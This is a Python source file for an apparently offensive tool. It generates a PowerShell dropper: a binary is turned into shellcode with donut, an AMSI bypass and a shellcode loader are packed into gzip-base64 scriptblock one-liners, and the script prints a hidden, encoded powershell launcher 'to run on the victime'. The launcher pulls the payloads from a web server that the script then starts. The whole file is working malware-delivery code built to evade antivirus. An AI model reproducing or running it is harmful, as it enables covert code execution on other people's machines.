import sys, getopt
import os
import random
import string
import subprocess
from io import BytesIO 
import gzip
import base64
from http.server import HTTPServer, SimpleHTTPRequestHandler


def main(argv):
    if(len(argv)<8):
            print ('On Windows:\nGeneratePowershellLauncher.py -i 127.0.0.1 -p 8000 -b C:\\Windows\\System32\\calc.exe -a "some args"')
            print ('On linux:\nGeneratePowershellLauncher.py -i 127.0.0.1 -p 8000 -b ./calc.exe -a "some args"')
            exit()

    ip=""
    port=""
    binary=""
    binaryArgs=""

    opts, args = getopt.getopt(argv,"hi:p:b:a:",["ip=","port=","binary=","args="])
    for opt, arg in opts:
            if opt == '-h':
                    print ('On Windows:\nGenerateDropperBinary.py -i 127.0.0.1 -p 8000 -b C:\\Windows\\System32\\calc.exe -a "some args"')
                    print ('On linux:\nGenerateDropperBinary.py -i 127.0.0.1 -p 8000 -b ./calc.exe -a "some args"')
                    sys.exit()
            elif opt in ("-b", "--binary"):
                    binary = arg
            elif opt in ("-a", "--args"):
                    binaryArgs = arg
            elif opt in ("-i", "--ip"):
                    ip = arg
            elif opt in ("-p", "--port"):
                    port = arg
    
    print('[+] Generate dropper for params:')
    print('ip ', ip)
    print('port ', port)
    print('binary ', binary)
    print('binaryArgs ', binaryArgs)
    print('')

    if os.name == 'nt':
            args = ('.\\ressources\\donut.exe', '-f', '2', '-m', 'go', '-p', binaryArgs, '-o', '.\\shellcode.b64', binary)
    else:   
            args = ('./ressources/donut', '-f', '2', '-m', 'go', '-p', binaryArgs, '-o', './shellcode.b64', '-i', binary)
    popen = subprocess.Popen(args, stdout=subprocess.PIPE)
    popen.wait()
    output = popen.stdout.read()
    
    print("[+] Generate shellcode of payload with donut")
    print(output.decode("utf-8") )

    shellcode = open("shellcode.b64", "rb").read()
    amsiBypass = open("AmsiBypass.template", "rb").read()
    shellCodeLoader = open("ShellcodeLoader.template", "rb").read()
    oneLiner = open("oneLinerToExec.template", "rb").read()

    # creat AMIS bypass payload
    out = BytesIO()
    with gzip.GzipFile(fileobj=out, mode="wb") as f:
    	f.write(amsiBypass)
    base64_bytes = base64.b64encode(out.getvalue())
    amsiOneLiner = "&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(('{}')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))".format(base64_bytes.decode("utf-8"))

    # creat Shellcode loader payload
    script = shellCodeLoader.replace(b"SHELL_CODE", shellcode)

    out = BytesIO()
    with gzip.GzipFile(fileobj=out, mode="w") as f:
    	f.write(script)
    base64_bytes = base64.b64encode(out.getvalue())
    shellcodeLoaderOneliner = "&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(('{}')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))".format(base64_bytes.decode("utf-8"))
    
    f1 = open("./web/payloadAmsi.ps1", "w")
    f1.write(amsiOneLiner)
    f1.close()

    f2 = open("./web/payloadShellcode.ps1", "w")
    f2.write(shellcodeLoaderOneliner)
    f2.close()

    # output the oneliner to run on the victime
    script = oneLiner.replace(b"IP_WEBSERV", ip.encode())
    script = script.replace(b"PORT_WEBSERV", port.encode())
    script = script.replace(b"PAYLOAD_AMSI", b"payloadAmsi.ps1")
    script = script.replace(b"PAYLOAD_SHELLCODE", b"payloadShellcode.ps1")
    script_utf16 = script.decode("utf-8").encode("utf_16_le")
    base64_bytes = base64.b64encode(script_utf16)

#     oneLiner = "powershell.exe -nop -e {}".format(base64_bytes.decode("utf-8"))
    oneLiner = "powershell.exe -nop -w hidden -e {}".format(base64_bytes.decode("utf-8"))

    os.remove("shellcode.b64")
    print(oneLiner)

    print("[+] Web delivery on web server {} : {}".format(ip, port))
    os.chdir("./web")
    httpd = HTTPServer(('0.0.0.0', int(port)), SimpleHTTPRequestHandler)
    httpd.serve_forever()


if __name__ == "__main__":
    main(sys.argv[1:])

